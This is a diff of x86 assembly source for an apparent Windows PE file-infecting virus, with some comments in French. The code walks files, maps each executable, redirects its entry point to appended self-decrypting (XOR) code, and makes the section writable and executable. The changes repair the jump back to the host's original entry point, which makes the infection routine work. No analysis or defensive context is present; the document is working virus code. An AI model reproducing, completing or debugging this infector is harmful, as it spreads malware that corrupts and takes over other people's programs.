@@ -55,6 +55,7 @@ GETLABELOFFSET	macro labelBegin, labelEnd, dest
 main:
 	mov ebx, [esp]
 	jmp crypted_code_end
+	jmp main
 	signature db 44 DUP(44h)
 
 applyxorvalue	proc addrbegin:dword, addrend:dword, value:dword
@@ -219,6 +220,17 @@ movloc	macro	dest, src
 
 		endm
 
+SUBLOC	macro dst, src
+
+	push edi
+
+	mov edi, dst
+	sub edi, src
+	mov dst, edi
+
+	pop edi
+		endm
+
 addloc macro	dest, src
 
 	push edi
@@ -262,6 +274,7 @@ getPEBaseAddr proc PEAddr:dword
 	mov eax, [ebx].ImageBase
 	assume ebx:nothing
 	ret
+
 getPEBaseAddr endp
 
 getExportedProcAddr proc PEHeader:dword, PEBaseAddr:dword, ProcName:dword, ProcNameSize:dword
@@ -276,7 +289,6 @@ getExportedProcAddr proc PEHeader:dword, PEBaseAddr:dword, ProcName:dword, ProcN
 	add ebx, 18h				;; Optional header
 	add ebx, 60h				;; IMAGE_DATA_DIRECTORY[0]
 	
-
 	assume ebx:ptr IMAGE_DATA_DIRECTORY
 	movloc exportSectionVAddr, [ebx].VirtualAddress
 	assume ebx:nothing
@@ -382,10 +394,10 @@ filesLoop proc k32hmodule:HMODULE, prcGetProcAddr:dword, sectionSize:dword, code
 	local fileMapping:dword
 	local fileView:dword
 	local originalEntryPoint:dword
-	local infectionEntryPoint:dword
 	local newSectionStart:dword
 	local virtualSectionStart:dword
 	local localdelta:dword
+	local entryInFile:dword
 
 	local prcFindFirstFile:dword
 	local prcFindNextFile:dword
@@ -487,7 +499,6 @@ fileMainLoop:
 	je fileClose
 	mov fileMapping, eax
 
-
 	;invoke prcMapViewOfFile, fileMapping, FILE_MAP_ALL_ACCESS, 0, 0, 0
 	push 0
 	push 0
@@ -564,7 +575,8 @@ fileMainLoop:
 	; save the entry point of the prg
 	mov esi, [ebx].OptionalHeader.AddressOfEntryPoint
 	mov originalEntryPoint, esi
-;	add esi, [ebx].OptionalHeader.ImageBase
+
+	;;addloc originalEntryPoint, [ebx].OptionalHeader.ImageBase
 
 ; --------------------------------------------------------------------------------------------------
 
@@ -576,7 +588,7 @@ fileMainLoop:
 	dec edx ; don't go to far
 
 	; get to the right place
-	; TODO: a fix ?
+
 	mov ecx, edx
 	.while byte ptr [edx] == 0 || byte ptr [edx] == 90h
 		dec edx
@@ -590,7 +602,6 @@ fileMainLoop:
 	add eax, [edi].SizeOfRawData ; the vadress of the end of the section
 	sub eax, ecx
 	mov [ebx].OptionalHeader.AddressOfEntryPoint, eax ; writing
-	mov infectionEntryPoint, eax
 
 	push esi
 	push edi
@@ -615,16 +626,28 @@ __getcur0:
 	pop edi
 	pop esi
 
+	push esi
+
 	mov eax, newSectionStart
 	add eax, codeSize ; go to the very end of what we copied.
+
+	movloc entryInFile, fileView
+	addloc entryInFile, originalEntryPoint
+
 	sub eax, 6 ; go back 6 bytes, which is ret and 5 nops
+
+	mov esi, entryInFile
+	sub esi, eax
+	mov originalEntryPoint, esi
+
 	; copy the real entry point adress
-	mov byte ptr [eax], 0EAh ; E9h JMP, E8h CALL ; bug du compilo
+	mov byte ptr [eax], 0E9h ; E9h JMP, E8h CALL ; bug du compilo
 	inc eax
-
-
-	;; TODO : originalEntryPoint pas bon
+	
+	mov esi, eax
+	add esi, 5h
 	mov ecx, originalEntryPoint
+	;;sub ecx, esi
 	mov dword ptr [eax], ecx
 	or [edi].Characteristics, IMAGE_SCN_MEM_EXECUTE
 	or [edi].Characteristics, IMAGE_SCN_MEM_WRITE
@@ -639,6 +662,8 @@ __getcur0:
 
 	; END SCRAT
 	
+	pop esi
+
 	; TODO : change the XOR value (label: crypt_key_value)
 	; XOR the content of fileview with the new value, between labels crypted_code_begin and crypted_code_end
 	; treatment is done !
@@ -705,8 +730,6 @@ Kernel32Init:
 	invoke getPEBaseAddr, K32PEHeaderAddr
 	mov K32BaseAddr, eax
 
-
-
 	invoke getExportedProcAddr, K32PEHeaderAddr, K32BaseAddr, localDelta, sizeof LoadLibraryStr
 	mov procLoadLibrary, eax
 	
@@ -757,8 +780,6 @@ Kernel32Init:
 	ret
 beginInfection endp
 
-
-
 startinf:
 
 	xor eax, eax
@@ -783,9 +804,10 @@ start_uncrypt:
 
 	;invoke applyxorvalue, offset crypted_code_begin, offset crypted_code_end, CKV
 	jmp startinf
-
+	
 final_return:
 	; making room for the very last jmp instruction ...
+final_jump:
 	nop
 	nop
 	nop
